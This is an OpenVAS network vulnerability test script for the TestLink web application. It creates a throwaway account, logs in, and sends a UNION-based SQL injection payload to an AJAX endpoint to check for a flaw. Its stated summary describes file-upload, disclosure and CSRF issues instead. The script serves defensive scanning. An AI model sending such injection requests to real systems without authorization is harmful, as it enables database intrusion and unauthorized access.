###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_testlink_54990.nasl 12 2013-10-27 11:15:33Z jan $
#
# TestLink Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "TestLink is prone to multiple security vulnerabilities, including:

1. An arbitrary file-upload vulnerability
2. An information-disclosure vulnerability
3. A cross-site request-forgery vulnerability

Exploiting these vulnerabilities may allow an attacker to harvest
sensitive information, upload and execute arbitrary server side code
in the context of the web server, or perform unauthorized actions on
behalf of a user in the context of the site. This may aid in launching
further attacks.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103536";
CPE = "cpe:/a:teamst:testlink";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54990);
 script_tag(name:"cvss_base", value:"7.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:N");
 script_version ("$Revision: 12 $");

 script_name("TestLink Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54990");
 script_xref(name : "URL" , value : "http://www.teamst.org/");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-08-15 10:10:37 +0200 (Wed, 15 Aug 2012)");
 script_description(desc);
 script_summary("Determine if TestLink is vulnerable to sql injection");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("testlink_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("testlink/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

login = rand();
pass = rand();
fname = 'openvas_' + rand();
lname = 'openvas_' + rand(); 

host = get_host_name();

create_account_post = 'login=' + login  + '&password=' + pass + '&password2=' + pass + '&firstName=' + fname + '&lastName=' + lname + '&email=' + lname + '@openvas.org&doEditUser=Add+User+Data';
len = strlen(create_account_post);

req = string("POST ",dir,"/firstLogin.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n",
             create_account_post);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result !~ "HTTP/1.. 200" || "location.href=" >!< result)exit(0);

login_post = 'reqURI=&destination=&tl_login=' + login  + '&tl_password=' + pass  + '&login_submit=Login';
len = strlen(login_post);

req = string("POST ",dir,"/login.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n",
             login_post);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result !~ "HTTP/1.. 200" || "location.href=" >!< result)exit(0);

session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:result);
if(isnull(session_id[1]))exit(0);

id = rand();

req = string("GET ",dir,"/lib/ajax/gettprojectnodes.php?root_node=-1+union+select+0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6-- HTTP/1.1\r\n",
             "Host: ",host,"\r\n",
             "Cookie: ",session_id[1],"\r\n\r\n");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("OpenVAS-SQL-Injection-Test" >< result) {
  security_hole(port:port);
  exit(0);
}

exit(0);
